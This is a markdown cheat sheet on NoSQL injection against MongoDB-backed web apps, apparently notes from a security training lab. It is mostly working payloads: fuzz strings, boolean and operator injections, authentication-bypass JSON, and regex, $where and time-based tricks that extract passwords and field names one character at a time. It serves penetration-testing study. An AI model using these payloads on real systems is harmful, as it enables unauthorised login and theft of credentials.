# NoSQL Injections
There are two main types of NoSQL injections:
* Syntax injection (similar to sqli methodology)
* Operator injection
Most popular NoSQL DB is mongo  

## Example
User's query:
```
https://insecure-website.com/product/lookup?category=fizzy
```
Json query to mongo's collection:
```
this.category == 'fizzy'
```
Example of fuzz string (to detect any error):
```
'"`{
;$Foo}
$Foo \xYZ
```
And URL-encoded request:
```
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Json adaptation of paylaod (to inject in parameters of request, not in URL):
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```
Simple test is applying `'` and `\'`, In first step, request must be broken and when we escape the quote, request must be valid.  

### Confirming conditional behaviour
Next we can test for boolean-based attack:
```
' && 0 && 'x
' && 1 && 'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```
If responses differ, we are able to influence boolean logic of application.  
### Overriding existing conditions
We can send payload similar to `' OR 1=1` in SQLi:
```
'||1||'
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27
```
Result in query:
```
this.category == 'fizzy'||'1'=='1'
```
Also we can add null byte at the end of payload (same as -- in sqli)
## Operator injection
* $where - document that satisfies JS expression
* $ne - not equal
* $in - all values in array
* $regex - matches regex
In JSON queries we can submit operators as nested queries:
```
{"username":{"$ne":"invalid"}}
```
For URL-based inputs we can insert queries only in URL parameters:
```
username[$ne]=invalid
```
If it doesn't work, try next:
* Change GET to POST
* Content-type to application/json
* Move url request into JSON message and insert operators there

If request doesn't seem to contain any operators, we can try to inject them by ourselves:
```
{"username":"wiener","password":"peter", "$where":"0"} (false)
{"username":"wiener","password":"peter", "$where":"1"} (true)
```

### Bypassing authentication:
```
{"username":{"$ne":"invalid"},"password":{"peter"}}
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

## Exfiltrating data 
```
admin' && this.password[0] == 'a' || 'a'=='b
OR
admin' && this.password.match(/\d/) || 'a'=='b
```
Last query checks for digits in password
Check for password length:
```
administrator' && this.password.length < 30 || 'a' == 'b'
```

## Identifying field names
First we need to detect responses for existing and non-existing fields. For example, if we know that username field is present:
```
admin' && this.username!=' 
admin' && this.foo!='
```
Next we can try dictionary attack to check responses and see what fields exist and what don't.  
Also we can use operator injection to extract field names character by character.  
To extract field names sign by sign we can use `keys()` JS method:
```
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```
In this payload `(this)[0]` - is a number of field (id, username etc), {0} - is a character position and a - is a character we are testing.  

### Exfiltrating data using operators
If we can't use JS syntax, we can try exfiltrate fields with `$regex`:
```
Check if method is supported:
{"username":"admin","password":{"$regex":"^.*"}}
Check if password starts from 'a':
{"username":"admin","password":{"$regex":"^a*"}}
```

## Time-based injection
```
{"$where": "sleep(5000)"}
```
### Exfiltrating data
```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```